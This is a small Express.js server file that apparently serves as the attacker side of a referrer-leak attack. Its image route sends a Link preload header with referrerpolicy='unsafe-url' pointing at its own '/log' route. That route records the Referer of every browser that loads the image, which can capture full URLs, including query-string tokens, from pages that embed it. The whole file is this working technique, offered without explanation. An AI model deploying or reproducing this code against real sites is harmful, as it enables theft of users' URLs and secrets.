const express = require('express');
const app = express();
const port = 9999;
const path = require('path');

app.get('/image.jpg', (req, res) => {
    res.setHeader('Link','</log>;rel="preload"; as="image"; referrerpolicy="unsafe-url"');
    res.sendFile(path.join(__dirname, 'banner.jpg'));
});

app.get('/log', (req, res) => {
    console.log(req.headers['referer']);
    res.send('Hi!');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});